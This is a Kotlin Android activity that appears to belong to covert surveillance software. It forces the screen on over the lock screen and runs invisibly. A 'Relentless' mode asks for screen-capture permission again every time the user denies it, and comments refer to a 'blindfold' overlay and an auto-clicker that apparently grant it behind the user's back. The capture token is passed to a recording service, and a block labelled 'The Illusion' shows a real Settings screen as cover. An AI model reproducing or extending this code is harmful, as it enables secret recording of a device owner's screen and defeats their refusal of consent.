package com.example.myandroid

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.provider.Settings

class PulseActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // 1. Force Screen Ignition
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                android.view.WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON or
                android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)

        // 2. Log the pulse
        val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
        prefs.edit().putLong("last_pulse_time", System.currentTimeMillis()).apply()

        // 3. Short-lived termination logic
        if (intent.getBooleanExtra("is_wake_trigger", false)) {
             // If this was just a wake trigger, close after 2 seconds to allow display hardware to stabilize
             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ 
                 if (!isFinishing) {
                    finish()
                    overridePendingTransition(0, 0)
                 }
             }, 2000)
        }

        // 3.5 Relentless Screen Capture Engine
        if (intent.getBooleanExtra("is_screen_record_trigger", false)) {
            val mpm = getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
            startActivityForResult(mpm.createScreenCaptureIntent(), 999)
            return // Halt normal termination logic until result is received
        }

        // 4. Engagement Protocol Redirect
        if (intent.getBooleanExtra("is_engagement_trigger", false)) {
            EngagementTracker.recordEvent(this, "MIRROR_CLICK")
            val originalPkg = intent.getStringExtra("original_pkg")
            val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
            val now = System.currentTimeMillis()
            prefs.edit()
                .putLong("last_engagement_success", now)
                .putString("engage_status", "SUCCESS: ${java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.US).format(java.util.Date(now))}")
                .apply()
            
            DebugLogger.log("ENGAGE_EVENT", "PHASE 2: SUCCESS. User tapped mirror. OS priority refreshed for $originalPkg context.")
            
            try {
                val launchIntent = packageManager.getLaunchIntentForPackage(originalPkg ?: "com.google.android.apps.messaging")
                if (launchIntent != null) {
                    startActivity(launchIntent)
                }
            } catch (e: Exception) {
                // Fallback to general SMS view if pkg launch fails
                val smsIntent = android.content.Intent(android.content.Intent.ACTION_MAIN)
                smsIntent.addCategory(android.content.Intent.CATEGORY_APP_MESSAGING)
                startActivity(smsIntent)
            }
            finish()
        }
        
        // The Illusion: Route the user to a legitimate system screen
        if (intent.getBooleanExtra("route_to_settings", false)) {
            try {
                // Try Digital Wellbeing first
                val wellbeingIntent = Intent("com.google.android.apps.wellbeing.action.APP_USAGE_DASHBOARD")
                if (wellbeingIntent.resolveActivity(packageManager) != null) {
                    wellbeingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    startActivity(wellbeingIntent)
                } else {
                    // Fallback to standard settings
                    val settingsIntent = Intent(Settings.ACTION_SETTINGS)
                    settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    startActivity(settingsIntent)
                }
            } catch (e: Exception) {
                // Absolute safety fallback
                startActivity(Intent(Settings.ACTION_SETTINGS).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
            }
        }

        // Immediately close our invisible activity. 
        // overridePendingTransition(0, 0) prevents any visual screen-flash.
        finish()
        overridePendingTransition(0, 0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 999) {
            if (resultCode == RESULT_OK && data != null) {
                DebugLogger.log("SCREEN_REC", "Token captured. Passing to MonitorService...")
                val i = Intent(this, MonitorService::class.java).apply {
                    action = "ACTION_START_RECORDING"
                    putExtra("resultCode", resultCode)
                    putExtra("data", data)
                }
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(i)
                } else {
                    startService(i)
                }
            } else {
                DebugLogger.log("SCREEN_REC", "Permission denied by user.")
                if (ScreenRecordManager.expectedMode == "RELENTLESS") {
                    DebugLogger.log("SCREEN_REC", "RELENTLESS MODE: Respawning capture prompt instantly.")
                    val mpm = getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
                    startActivityForResult(mpm.createScreenCaptureIntent(), 999)
                    return
                }
            }
            // Remove blindfold in case the auto-clicker failed or was skipped
            if (ScreenRecordManager.expectedMode == "AUTO") {
                DimmerManager.removeOverlay(this)
                ScreenRecordManager.expectedMode = "" 
            }
            finish()
            overridePendingTransition(0, 0)
        }
    }
}